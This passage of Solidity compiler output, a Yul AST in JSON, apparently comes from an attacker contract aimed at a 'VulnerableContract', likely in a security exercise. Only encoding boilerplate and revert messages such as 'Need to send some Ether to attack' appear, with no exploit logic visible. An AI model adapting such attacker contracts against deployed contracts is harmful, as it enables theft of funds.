                "nodeType": "YulTypedName",
                "src": "211:6:2",
                "type": ""
              }
            ],
            "src": "152:262:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "485:53:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "502:3:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "525:5:2"
                          }
                        ],
                        "functionName": {
                          "name": "cleanup_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "507:17:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "507:24:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "495:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "495:37:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "495:37:2"
                }
              ]
            },
            "name": "abi_encode_t_address_to_t_address_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "473:5:2",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "480:3:2",
                "type": ""
              }
            ],
            "src": "420:118:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "643:100:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "660:3:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "730:5:2"
                          }
                        ],
                        "functionName": {
                          "name": "convert_t_contract$_VulnerableContract_$267_to_t_address_payable",
                          "nodeType": "YulIdentifier",
                          "src": "665:64:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "665:71:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "653:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "653:84:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "653:84:2"
                }
              ]
            },
            "name": "abi_encode_t_contract$_VulnerableContract_$267_to_t_address_payable_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "631:5:2",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "638:3:2",
                "type": ""
              }
            ],
            "src": "544:199:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "895:175:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "905:74:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "971:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "976:2:2",
                        "type": "",
                        "value": "23"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "912:58:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "912:67:2"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "905:3:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1000:3:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1005:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "996:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "996:11:2"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1009:25:2",
                        "type": "",
                        "value": "Only owner can withdraw"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "989:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "989:46:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "989:46:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1045:19:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1056:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1061:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1052:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1052:12:2"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1045:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "883:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "891:3:2",
                "type": ""
              }
            ],
            "src": "749:321:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1222:219:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1232:74:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1298:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1303:2:2",
                        "type": "",
                        "value": "33"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1239:58:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1239:67:2"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "1232:3:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1327:3:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1332:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1323:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1323:11:2"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1336:34:2",
                        "type": "",
                        "value": "Need to send some Ether to attac"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1316:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1316:55:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1316:55:2"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1392:3:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1397:2:2",
                            "type": "",
                            "value": "32"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1388:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1388:12:2"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1402:3:2",
                        "type": "",
                        "value": "k"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1381:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1381:25:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1381:25:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1416:19:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1427:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1432:2:2",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1423:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1423:12:2"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1416:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1210:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1218:3:2",
                "type": ""
              }
            ],
            "src": "1076:365:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1593:222:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1603:74:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1669:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1674:2:2",
                        "type": "",
                        "value": "36"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1610:58:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1610:67:2"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "1603:3:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1698:3:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1703:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1694:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1694:11:2"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1707:34:2",
                        "type": "",
                        "value": "Target amount must be greater th"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1687:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1687:55:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1687:55:2"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1763:3:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1768:2:2",
                            "type": "",
                            "value": "32"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1759:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1759:12:2"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1773:6:2",
                        "type": "",
                        "value": "an 0"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1752:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1752:28:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1752:28:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1790:19:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1801:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1806:2:2",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1797:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1797:12:2"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1790:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1581:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1589:3:2",
                "type": ""
              }
            ],
            "src": "1447:368:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1886:53:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1903:3:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "1926:5:2"
                          }
                        ],
                        "functionName": {
                          "name": "cleanup_t_uint256",
                          "nodeType": "YulIdentifier",
                          "src": "1908:17:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1908:24:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1896:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1896:37:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1896:37:2"
                }
              ]
            },
            "name": "abi_encode_t_uint256_to_t_uint256_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "1874:5:2",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1881:3:2",
                "type": ""
              }
            ],
            "src": "1821:118:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2043:124:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2053:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2065:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2076:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2061:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2061:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2053:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "2133:6:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2146:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2157:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2142:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2142:17:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_address_to_t_address_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2089:43:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2089:71:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2089:71:2"
                }
              ]
            },
            "name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2015:9:2",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "2027:6:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2038:4:2",
                "type": ""
              }
            ],
            "src": "1945:222:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2305:158:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2315:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2327:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2338:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2323:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2323:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2315:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "2429:6:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2442:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2453:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2438:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2438:17:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_contract$_VulnerableContract_$267_to_t_address_payable_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2351:77:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2351:105:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2351:105:2"
                }
              ]
            },
            "name": "abi_encode_tuple_t_contract$_VulnerableContract_$267__to_t_address_payable__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2277:9:2",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "2289:6:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2300:4:2",
                "type": ""
              }
            ],
            "src": "2173:290:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2640:248:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2650:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2662:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2673:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2658:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2658:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2650:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2697:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2708:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2693:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2693:17:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "2716:4:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2722:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "2712:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2712:20:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2686:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2686:47:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2686:47:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2742:139:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "2876:4:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2750:124:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2750:131:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2742:4:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2620:9:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2635:4:2",
                "type": ""
              }
            ],
            "src": "2469:419:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "3065:248:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "3075:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "3087:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "3098:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "3083:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3083:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3075:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3122:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "3133:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "3118:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3118:17:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "3141:4:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3147:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "3137:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3137:20:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "3111:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3111:47:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "3111:47:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "3167:139:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "3301:4:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3175:124:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3175:131:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3167:4:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_e2f180be35e050acd5a54fbb046a37cbdb052195a20ac5086857b2816d309170__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "3045:9:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "3060:4:2",
                "type": ""
              }
            ],
            "src": "2894:419:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "3490:248:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "3500:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "3512:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "3523:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "3508:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3508:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3500:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3547:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "3558:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "3543:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3543:17:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "3566:4:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3572:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "3562:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3562:20:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "3536:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3536:47:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "3536:47:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "3592:139:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "3726:4:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3600:124:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3600:131:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3592:4:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_f2fcfb1855a589b32b2878b73a2520b2bf7921f661dcf388dcc7453e4cee601f__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "3470:9:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "3485:4:2",
                "type": ""
              }
            ],
            "src": "3319:419:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "3842:124:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "3852:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "3864:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "3875:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "3860:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3860:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3852:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "3932:6:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3945:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "3956:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "3941:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3941:17:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_uint256_to_t_uint256_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3888:43:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3888:71:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "3888:71:2"
                }
              ]
            },
            "name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "3814:9:2",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "3826:6:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
